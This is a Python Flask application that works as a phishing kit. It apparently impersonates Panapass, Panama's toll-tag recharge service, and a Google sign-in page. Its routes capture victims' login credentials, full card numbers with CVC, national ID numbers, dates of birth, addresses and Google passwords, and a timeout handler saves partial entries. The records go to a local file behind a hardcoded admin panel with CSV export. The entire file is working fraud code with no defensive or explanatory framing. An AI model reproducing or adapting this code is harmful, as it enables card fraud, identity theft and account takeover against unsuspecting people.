from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file, make_response
import csv
import io
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Change to a secure random key
app.permanent_session_lifetime = 600  # 10 minutes session timeout

submissions = []

# Load existing data from file on startup (optional, to persist across restarts)
try:
    with open('captured_data.txt', 'r') as f:
        for line in f:
            # Parse lines roughly (adjust if format changes)
            parts = line.strip().split(', ')
            if len(parts) >= 19:  # Updated for new password field
                submissions.append({
                    'timestamp': parts[0].split('Tag: ')[1] if 'Tag:' in parts[0] else datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'tag_number': parts[0].split('Tag: ')[1] if 'Tag:' in parts[0] else '',
                    'amount_to_recharge': parts[1].split('Amount: ')[1] if 'Amount:' in parts[1] else '',
                    'select': parts[2].split('Payment: ')[1] if 'Payment:' in parts[2] else '',
                    'cardholder_name': parts[3].split('Name: ')[1] if 'Name:' in parts[3] else '',
                    'card_number': parts[4].split('Card: ')[1] if 'Card:' in parts[4] else '',
                    'expiration_date': parts[5].split('Expiry: ')[1] if 'Expiry:' in parts[5] else '',
                    'security_code': parts[6].split('CVC: ')[1] if 'CVC:' in parts[6] else '',
                    'email': parts[7].split('Email: ')[1] if 'Email:' in parts[7] else '',
                    'password': parts[8].split('Password: ')[1] if 'Password:' in parts[8] else '',  # New for loaded data
                    'phone_number': parts[9].split('Phone: ')[1] if 'Phone:' in parts[9] else '',
                    'date_of_birth': parts[10].split('DOB: ')[1] if 'DOB:' in parts[10] else '',
                    'id_number': parts[11].split('Cedula: ')[1] if 'Cedula:' in parts[11] else '',
                    'billing_address': parts[12].split('Street: ')[1] if 'Street:' in parts[12] else '',
                    'city': parts[13].split('City: ')[1] if 'City:' in parts[13] else '',
                    'province': parts[14].split('Province: ')[1] if 'Province:' in parts[14] else '',
                    'zip_code': parts[15].split('Zip: ')[1] if 'Zip:' in parts[15] else '',
                    'user_agent': '',  # Placeholder
                    'ip': '',  # Placeholder
                })
except FileNotFoundError:
    pass

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    panapass = request.form.get('panapass')
    password = request.form.get('password')
    print(f"Captured Initial Login: Panapass={panapass}, Password={password}")
    return redirect(url_for('form'))

@app.route('/google_auth')
def google_auth():
    return render_template('auth.html')

@app.route('/form')
def form():
    return render_template('form.html')

@app.route('/submit', methods=['POST'])
def handle_submit():
    tag = request.form.get('tag')
    amount = request.form.get('amount')
    payment_method = request.form.get('payment_method')
    full_name = request.form.get('full_name')
    card_number = request.form.get('card_number')
    expiry = request.form.get('expiry')
    cvc = request.form.get('cvc')
    email = request.form.get('email')
    phone = request.form.get('phone')
    dob = request.form.get('dob')
    cedula = request.form.get('cedula')
    street = request.form.get('street')
    city = request.form.get('city')
    province = request.form.get('province')
    zip_code = request.form.get('zip')
    
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    
    session['form_data'] = {
        'tag': tag,
        'amount': amount,
        'payment_method': payment_method,
        'full_name': full_name,
        'card_number': card_number,
        'expiry': expiry,
        'cvc': cvc,
        'email': email,
        'phone': phone,
        'dob': dob,
        'cedula': cedula,
        'street': street,
        'city': city,
        'province': province,
        'zip_code': zip_code,
        'user_agent': user_agent,
        'ip': ip,
    }
    session.permanent = True
    return redirect(url_for('google_auth'))

@app.route('/capture', methods=['POST'])
def capture_google():
    auth_email = request.form.get('email')
    auth_password = request.form.get('password')
    
    if not session.get('form_data'):
        return 'Session expired or invalid. Please start over.', 400
    
    form_data = session['form_data']
    
    submission = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'tag_number': form_data['tag'],
        'amount_to_recharge': form_data['amount'],
        'select': form_data['payment_method'],
        'cardholder_name': form_data['full_name'],
        'card_number': form_data['card_number'],
        'expiration_date': form_data['expiry'],
        'security_code': form_data['cvc'],
        'email': auth_email,
        'password': auth_password,
        'phone_number': form_data['phone'],
        'date_of_birth': form_data['dob'],
        'id_number': form_data['cedula'],
        'billing_address': form_data['street'],
        'city': form_data['city'],
        'province': form_data['province'],
        'zip_code': form_data['zip_code'],
        'user_agent': form_data['user_agent'],
        'ip': form_data['ip'],
    }
    
    submissions.append(submission)
    
    with open('captured_data.txt', 'a') as f:
        f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Amount: {submission['amount_to_recharge']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {auth_email}, Password: {auth_password}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}\n")
    
    session.pop('form_data', None)
    
    return 'Data captured successfully!'

@app.route('/timeout_capture', methods=['POST'])
def timeout_capture():
    if session.get('form_data'):
        form_data = session['form_data']
        
        submission = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'tag_number': form_data['tag'],
            'amount_to_recharge': form_data['amount'],
            'select': form_data['payment_method'],
            'cardholder_name': form_data['full_name'],
            'card_number': form_data['card_number'],
            'expiration_date': form_data['expiry'],
            'security_code': form_data['cvc'],
            'email': 'N/A (timeout)',
            'password': 'N/A (timeout)',
            'phone_number': form_data['phone'],
            'date_of_birth': form_data['dob'],
            'id_number': form_data['cedula'],
            'billing_address': form_data['street'],
            'city': form_data['city'],
            'province': form_data['province'],
            'zip_code': form_data['zip_code'],
            'user_agent': form_data['user_agent'],
            'ip': form_data['ip'],
        }
        
        submissions.append(submission)
        
        with open('captured_data.txt', 'a') as f:
            f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Amount: {submission['amount_to_recharge']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {submission['email']}, Password: {submission['password']}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}\n")
        
        session.pop('form_data', None)
        
        return '', 200
    return '', 400
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in ['Z', 'Carter Lions'] and password == 'Ominous':
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('admin_dashboard'))
        flash('Invalid credentials', 'error')
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    username = session.get('username', 'Admin')
    return render_template('admin.html', submissions=submissions, username=username)

@app.route('/admin/logout')
def admin_logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('admin_login'))

@app.route('/admin/download')
def admin_download():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Timestamp', 'Tag Number', 'Amount to be recharged', 'Select', 'Cardholder\'s Name', 'Card Number', 'Expiration Date', 'Security Code', 'Email', 'Password', 'Phone Number', 'Date of birth', 'ID Number', 'Billing Address', 'City', 'Province', 'Zip Code', 'User Agent', 'IP'])
    for sub in submissions:
        writer.writerow([sub['timestamp'], sub['tag_number'], sub['amount_to_recharge'], sub['select'], sub['cardholder_name'], sub['card_number'], sub['expiration_date'], sub['security_code'], sub['email'], sub['password'], sub['phone_number'], sub['date_of_birth'], sub['id_number'], sub['billing_address'], sub['city'], sub['province'], sub['zip_code'], sub['user_agent'], sub['ip']])
    
    output.seek(0)
    return send_file(io.BytesIO(output.getvalue().encode('utf-8')), mimetype='text/csv', as_attachment=True, download_name='submissions.csv')

@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    submissions.clear()
    open('captured_data.txt', 'w').close()
    flash('All data cleared')
    return redirect(url_for('admin_dashboard'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)